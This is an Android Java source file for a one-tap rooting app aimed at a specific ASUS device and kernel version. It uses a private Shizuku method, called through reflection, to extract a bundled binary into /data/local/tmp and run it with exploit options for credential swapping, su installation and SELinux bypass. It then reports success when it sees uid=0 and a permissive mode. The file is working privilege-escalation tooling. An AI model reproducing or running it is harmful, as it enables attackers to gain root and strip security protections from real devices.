package com.rog6d.onetap;

import android.app.Activity;
import android.os.Bundle;
import android.widget.*;
import rikka.shizuku.Shizuku;
import android.content.ComponentName;
import android.content.ServiceConnection;
import android.os.IBinder;

public class MainActivity extends Activity {
    private static final int REQ = 1001;
    /** Verified working option set for ASUS_AI2203_B / 5.10.218. */
    private static final String EXPLOIT_ARGS =
        "--use-setattr --stamp3 --perm-pc --cred-swap --install-su --stamp-off 0x100";

    private TextView status, out;
    private Button go;

    private final Shizuku.OnBinderReceivedListener onBinder = () -> runOnUiThread(() -> {
        status.setText("Shizuku 已连接");
        go.setEnabled(true);
    });

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(48, 64, 48, 48);

        status = new TextView(this); status.setTextSize(18); status.setText("等待 Shizuku…");
        go = new Button(this); go.setText("一键提权"); go.setEnabled(false);
        out = new TextView(this); out.setTextSize(11); out.setTextIsSelectable(true);
        ScrollView sc = new ScrollView(this); sc.addView(out);

        root.addView(status); root.addView(go);
        root.addView(sc, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f));
        setContentView(root);

        Shizuku.addBinderReceivedListenerSticky(onBinder);
        go.setOnClickListener(v -> run());
    }

    private boolean granted() {
        try {
            return Shizuku.isPreV11() || Shizuku.checkSelfPermission()
                    == android.content.pm.PackageManager.PERMISSION_GRANTED;
        } catch (Throwable t) { return false; }
    }

    private void run() {
        if (!granted()) {
            try { Shizuku.requestPermission(REQ); }
            catch (Throwable t) { status.setText("请先启动 Shizuku"); }
            return;
        }
        go.setEnabled(false);
        status.setText("执行中…（约 20-30 秒）");
        new Thread(this::exploit).start();
    }

    private volatile IUserService svc;

    private Shizuku.UserServiceArgs serviceArgs() {
        return new Shizuku.UserServiceArgs(
                new ComponentName(getPackageName(), UserService.class.getName()))
                .daemon(false).processNameSuffix("gh").debuggable(false).version(1);
    }

    private final ServiceConnection conn = new ServiceConnection() {
        @Override public void onServiceConnected(ComponentName n, IBinder binder) {
            svc = IUserService.Stub.asInterface(binder);
            new Thread(MainActivity.this::exploit).start();
        }
        @Override public void onServiceDisconnected(ComponentName n) { svc = null; }
    };

    private void exploit() {
        StringBuilder sb = new StringBuilder();
        String full;
        try {
            String apk = getPackageCodePath();
            /* The exploit re-execs itself by absolute path for the post-root
             * shell and the su daemon, so the file name must match what it
             * expects. */
            String bin = "/data/local/tmp/ghostlock510";
            String cmd = "unzip -p '" + apk + "' assets/gh510 > " + bin + " 2>/dev/null; "
                    + "chmod 755 " + bin + "; "
                    + bin + " " + EXPLOIT_ARGS + " 2>&1";
            java.lang.reflect.Method m = Shizuku.class.getDeclaredMethod(
                    "newProcess", String[].class, String[].class, String.class);
            m.setAccessible(true);
            Process p = (Process) m.invoke(null,
                    new String[]{"/system/bin/sh", "-c", cmd}, null, null);
            java.io.BufferedReader r = new java.io.BufferedReader(
                    new java.io.InputStreamReader(p.getInputStream()));
            String line;
            while ((line = r.readLine()) != null) {
                sb.append(line).append('\n');
                final String cur = sb.toString();
                runOnUiThread(() -> out.setText(cur));
            }
            p.waitFor();
            sb.append("[exit] ").append(p.exitValue()).append('\n');
            full = sb.toString();
        } catch (Throwable t) {
            sb.append("[error] ").append(t).append('\n');
            full = sb.toString();
        }
        final String fv = full;
        boolean ok = fv.contains("uid=0") && (fv.contains("enforce=0") || fv.contains("permissive verified"));
        runOnUiThread(() -> {
            status.setText(ok ? "✅ 成功：uid=0 / Permissive" : "⚠️ 未成功，见下方日志");
            out.setText(fv);
            go.setEnabled(true);
        });
    }

    @Override public void onRequestPermissionsResult(int req, String[] p, int[] res) {
        super.onRequestPermissionsResult(req, p, res);
        if (req == REQ && res.length > 0
                && res[0] == android.content.pm.PackageManager.PERMISSION_GRANTED) run();
        else status.setText("Shizuku 权限被拒绝");
    }

    @Override protected void onDestroy() {
        super.onDestroy();
        Shizuku.removeBinderReceivedListener(onBinder);
    }
}
